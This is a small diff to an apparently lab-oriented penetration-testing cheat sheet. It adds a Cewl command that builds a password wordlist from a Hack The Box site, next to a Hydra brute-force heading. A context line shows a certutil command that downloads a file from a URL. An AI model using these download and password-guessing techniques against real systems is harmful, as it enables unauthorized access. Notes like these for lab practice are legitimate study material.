@@ -60,6 +60,14 @@ cmd.exe /C net use /D /Y * && cmd.exe /C certutil.exe -urlcache -split -f 'http:
 
 ## Tools
 
+### Cewl
+
+#### Generate password list
+
+```
+cewl -w cewl-forum.txt -e -a http://gorum.bart.htb
+```
+
 ### Hydra
 
 #### Brute force login form http
